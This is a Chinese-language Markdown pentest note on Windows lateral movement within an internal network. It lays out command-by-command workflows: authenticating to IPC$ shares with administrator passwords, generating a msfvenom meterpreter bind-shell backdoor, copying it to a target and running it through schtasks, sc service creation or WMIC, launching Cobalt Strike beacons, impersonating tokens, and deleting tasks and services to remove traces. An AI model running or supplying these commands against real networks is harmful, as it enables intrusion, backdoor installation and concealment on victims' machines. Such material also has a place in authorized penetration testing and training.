# 内网渗透-横向移动

横向移动：对同网段的内网机器进行攻击



## 构建代理横向渗透

- 构建代理参考[内网多级代理](./内网多级代理.md)



## IPC连接(445端口共享连接)

IPC共享命名管道，连接445端口，提供账户密码后，可以进行默认文件共享及资源管理



**先决条件**

1. 开放139、445端口(默认开启)
2. 目标开启ICP共享服务(默认开启)
3. 管理员账号密码



**IPC默认共享**

查看共享文件：net share

1. 共享所有磁盘：C:\\ -> c$
2. Admin共享 C:\windows\ ->ADMIN$
3. IPC远程 IPC$

```tex
!!! 注意： SYSTEM 用户是无法建立IPC连接的
msf降权：
load incognito
list_token -u 
impersonate_token WIN-POVQ8FCTTO4\\Administrator

不用msf怎么降权？
把当前进程迁移到低权限进程中即可

```

建立IPC连接

​	net use \\\ip\ipc$ /user:administrator "[密码]"

查看已建立的连接 

​	net use

删除已建立的连接

​	net use \\192.168.1.101\c$ /delete 

IPC常见用法

​	dir \\192.168.1.101\c$

​	dir \\192.168.1.101\c$\windows

​	copy 1.txt \\192.168.1.101\c$

​	copy \\192.168.1.101\c$\2.txt  2.txt

​	windows常见的文件管理命令都能执行



## IPC + schtask(计划任务)

schtasks /create /s [目标ip] /u administrator /p "[密码]" /sc /MINUTE /mo 1 /tn [任务名] /tr "[绝对路径目标程序]"

创建一个每分钟执行一次指定程序的计划任务

如果已经建立IPC连接，可以略去凭据

schtasks /create /s [目标ip] /sc MINUTE /mo 1 /tn [任务名] /tr "[绝对路径目标程序]"

```tex
# schtask横向移动流程

1. 建立IPC连接 
cmd> net use \\192.168.1.101\ipc$  /user:administrator "teamssix.com"
cmd> net use  

2. 上传msfvenom正向后门
VPS_shell> msfvenom -p windows/x64/meterpreter/bind_tcp lport=10001 -f exe -o bind10001.exe 
上传后门到第一台机器，再通过第一台机器的IPC上传到第二台机器
meterpreter> upload bind10001.exe ./
cmd> copy bind10001.exe \\192.168.1.101\c$
cmd> dir \\192.168.1.101\c$

3. 创建计划任务，运行后门
cmd> schtasks /create /s 192.168.1.101 /sc MINUTE /mo 1 /tn test /tr "C:\bind10001.exe"

4. 连接后门，上线 meterpreter
meterpreter> run autoroute -s 192.168.1.0/24
msfconsole> handler -p windows/x64/meterpreter/bind_tcp -H 192.168.1.101 -P 10001

5. 删除计划任务
schtasks /delete /s 192.168.1.101 /tn test /f

```



## IPC + SC(services controller)

```tex
# cobalt strike-SC横向移动流程

1. 在192.168.1.101 机器上创建一个服务，服务的名字 testservice， 服务的启动路径是C:\beacon.exe
sc \\192.168.1.101 create testservice binpath= 'C:\beacon.exe'

2. 查看192.168.1.101机器 testservice服务的详细信息
sc \\192.168.1.101 qc testservice

3. 启动192.168.1.101 的 testservice 服务，其实就是启动C：\beacon.exe
sc \\192.168.1.101 testservice

4. 删除192.168.1.101的 testservice服务，清除痕迹
sc \\192.168.1.101 delete testservice

```



## IPC + WMIC

```tex
# cobalt strike-WMIC横向移动

1. 建立IPC连接

2. 查询远程机器进程信息
wmic /node:192.168.1.101 /user:administrator /password:teamssix.com process list brief

- 如果已经建立了IPC连接，凭据信息可以省略
wmic /node:192.168.1.101  process list brief

3. 在远程机器开启进程: 执行命令 -> wmic执行命令没有回显
wmic /node:192.168.1.101 process call create "cmd.exe /c ipconfig"

- 在远程机器开启进程: 执行命令 -> wmic执行命令查看回显
wmic /node:192.168.1.101 process call create "cmd.exe /c ipconfig > C:\hahaha.txt"
type \\192.168.1.101\c$\hahaha.txt

4. 在远程机器开启进程: 执行后门 
wmic /node:192.168.1.101 process call create "C:\beacon.exe"

```

